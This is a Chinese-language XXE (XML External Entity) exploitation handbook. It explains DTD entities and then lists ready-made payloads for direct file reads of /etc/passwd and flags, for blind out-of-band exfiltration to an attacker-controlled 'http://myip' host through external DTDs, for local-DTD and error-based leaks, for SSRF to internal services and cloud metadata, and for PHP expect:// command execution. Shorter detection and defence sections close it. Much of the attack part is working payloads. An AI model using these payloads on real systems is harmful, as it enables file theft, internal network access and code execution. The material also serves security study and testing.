# EXP手册-XXE Injection(XML External Entity Injection)

## 一句话理解
XXE（XML External Entity Injection）是指应用在解析 XML 时，允许外部实体被解析，攻击者便可借助实体机制读取文件、发起请求、进行带外回传，甚至在特定环境下触发更深层的利用。

## 利用前提
XXE 能否成立，通常取决于以下条件：
- 应用接收并解析 XML 数据
- 解析器允许 DTD 或外部实体
- 传入内容能进入 XML 解析过程
- 解析结果、报错信息或带外请求能被观察到

常见入口：
- XML API
- SOAP / WebService
- SAML
- SVG
- Office 文档格式
- RSS / Atom
- 文件上传后由后端进行 XML 解析

## 基础知识
### 1. XML 与 DTD
DTD（Document Type Definition）用于定义 XML 文档结构，可声明元素、实体和外部资源引用。

示例：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ELEMENT message (receiver, sender, header, msg)>
<!ELEMENT receiver (#PCDATA)>
<!ELEMENT sender (#PCDATA)>
<!ELEMENT header (#PCDATA)>
<!ELEMENT msg (#PCDATA)>
]>
<message>
  <receiver>Myself</receiver>
  <sender>Someone</sender>
  <header>TheReminder</header>
  <msg>This is an amazing book</msg>
</message>
```

### 2. 实体类型
内部实体：

```xml
<!ENTITY xxe "test">
```

外部实体：

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

参数实体：

```xml
<!ENTITY % remote SYSTEM "http://attacker/evil.dtd">
```

引用方式：
- 普通实体使用 `&name;`
- 参数实体使用 `%name;`，且只能在 DTD 中使用

### 3. 为什么 CDATA 有用
当读取到的内容中包含特殊字符时，XML 解析可能出错。`CDATA` 可以让内容作为纯文本处理，而不是再次按 XML 标签解释。

```xml
<![CDATA[
raw text here
]]>
```

如果要把读取到的文件包进 `CDATA` 中，可以借助外部 DTD 进行拼接。

`evil.dtd`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY all "%start;%goodies;%end;">
```

注入内容：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [
<!ENTITY % start "<![CDATA[">
<!ENTITY % goodies SYSTEM "file:///d:/test.txt">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://ip/evil.dtd">
%dtd;
]>
<roottag>&all;</roottag>
```

## 常见危害
- 读取本地文件，例如配置、源码、密钥、口令
- 通过 HTTP/DNS 做带外回传
- 作为 SSRF 访问内网服务
- 通过报错信息泄露敏感数据
- 在特定解析环境下触发协议级利用
- 与反序列化、文件上传、文档解析链形成复合漏洞

## 漏洞利用分类
### 1. 直接回显读取文件
适用于读取内容会进入响应体或页面的场景。

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>
```

### 2. 无回显读取文件 OOB
当应用不直接返回解析结果时，可尝试 Blind XXE，通过带外通道把数据送出。

关键点：
- 使用外部 DTD
- 利用参数实体嵌套
- 借助 HTTP 或 DNS 回传

参数实体示例：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ENTITY normal "hello">
<!ENTITY normal SYSTEM "http://xml.org/hhh.dtd">
<!ENTITY % para SYSTEM "file:///1234.dtd">
%para;
]>
```

参数实体嵌套时，内层 `%` 通常需要编码，否则容易解析失败：

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % outside '<!ENTITY &#x25; files SYSTEM "file:///etc/passwd">'>
]>
```

#### Payload 1
外部 DTD `my.dtd`：

```xml
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip/?%file;'>">
%start;
```

注入内容：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ENTITY % remote SYSTEM "http://myip/my.dtd">
<!ENTITY % file SYSTEM "file:///flag">
%remote;
%send;
]>
```

#### Payload 2
利用本地 DTD 进行更深层嵌套，适合某些 Blind XXE 场景：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % ISOamso '
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://myip/?&#x25;file;&#x27;>">
  &#x25;eval;
  &#x25;send;
'>
%remote;
]>
```

### 3. 基于报错读取文件
思路与 OOB 接近，只是把文件内容拼接进错误路径中，让解析器把敏感内容带到错误信息里。

#### Payload 1
外部 DTD `my.dtd`：

```xml
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'file:///re.about/%file;'>">
%start;
```

注入内容：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ENTITY % remote SYSTEM "http://myip/my.dtd">
<!ENTITY % file SYSTEM "file:///flag">
%remote;
%send;
]>
```

#### Payload 2

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % ISOamso '
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;file://re.about/?&#x25;file;&#x27;>">
  &#x25;eval;
  &#x25;send;
'>
%remote;
]>
```

#### Payload 3
有些环境即使不引用外部 DTD，也可能因为实现不严格而在多层嵌套中完成报错利用：

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ELEMENT message ANY>
<!ENTITY % para1 SYSTEM "file:///flag">
<!ENTITY % para '
  <!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;para1;&#x27;>">
  &#x25;para2;
'>
%para;
]>
```

### 4. 作为 SSRF 使用
如果可以引用外部 URL，XXE 本质上也能转化成 SSRF：

```xml
<?xml version="1.0"?>
<!DOCTYPE any [
<!ENTITY f SYSTEM "http://127.0.0.1:80">
]>
<x>&f;</x>
```

利用方向：
- 访问内网 Web
- 探测端口
- 探测出网
- 访问云元数据

### 5. 特定环境下的代码执行
这类情况不常见，但在配置不当时可能出现。例如 PHP 开启 `expect` 扩展时：

```xml
<?xml version="1.0"?>
<!DOCTYPE gvi [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "expect://id">
]>
<root>
  <name>&xxe;</name>
</root>
```

### 6. 协议扩展与文件写入
某些 Java 环境、解析器或应用处理链支持更多协议，例如：
- `jar://`
- `netdoc://`
- 各种语言运行时额外支持的自定义协议

这类能力有时可被用于：
- 列目录
- 读取压缩包内容
- 与文件上传链路结合

## 不同环境差异
### 1. 语言与解析器差异很大
XXE 是否成立，不只取决于语言，还取决于：
- 使用的是哪个 XML 解析器
- DTD 是否启用
- 外部实体是否启用
- 是否允许网络访问
- 错误信息是否暴露

### 2. 现代框架可能默认关闭
很多现代库默认会禁用外部实体，但历史代码、兼容模式、手工配置、第三方组件经常会把风险重新带回来。

### 3. 文档格式是高频入口
不要只盯着显式 XML 接口，以下格式本质上都可能触发 XML 解析：
- SVG
- DOCX / XLSX / PPTX
- Android XML
- 各类导入导出文件

## 检测思路
### 1. 先确认是否解析 XML
关注请求头、接口文档、上传格式、SOAP 特征、报错信息。

### 2. 先用最小探针
优先验证：
- 能否插入 `DOCTYPE`
- 是否允许实体解析
- 是否存在外带请求

### 3. 从直接回显逐步升级
排查顺序建议：
1. 直接读取本地文件
2. 访问外部可控 URL
3. 使用外部 DTD 做 OOB
4. 尝试报错型读取
5. 结合协议特性探索更深利用

## 防御要点
### 1. 禁用外部实体与 DTD
这是最核心的防御措施。

### 2. 使用安全解析器配置
确保：
- 禁止外部实体
- 禁止外部 DTD
- 禁止网络访问
- 限制实体展开深度和资源消耗

### 3. 尽量不用 XML 处理不可信输入
若业务可替代，优先使用更简单且默认更安全的数据格式。

### 4. 最小化错误信息
不要把解析异常、文件路径、完整堆栈直接返回前端。

### 5. 网络层做隔离
即使出现 XXE，也要限制应用访问：
- 内网敏感服务
- 云元数据
- 本地文件系统

## 速查清单
- 先找所有会解析 XML 的接口和文件格式
- 先测 `DOCTYPE` 是否可用，再测实体是否被解析
- 先尝试直接回显，再尝试 OOB 和报错型利用
- 检查文档处理链、SVG、Office 文件、SOAP、SAML
- 检查是否能转化为 SSRF、文件读取、云凭证获取
- 结合语言、解析器和部署环境判断真实危害

## 入门资料
- [一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)
- [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)

![](https://raw.githubusercontent.com/ReAbout/web-exp/master/images/xxe1.png)
![](https://raw.githubusercontent.com/ReAbout/web-exp/master/images/xxe-injection.svg?sanitize=true)

## Reference
- [一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)
- [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)
- [Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
- [Blind XXE 详解与 Google CTF 一道题分析](https://www.freebuf.com/vuls/207639.html)
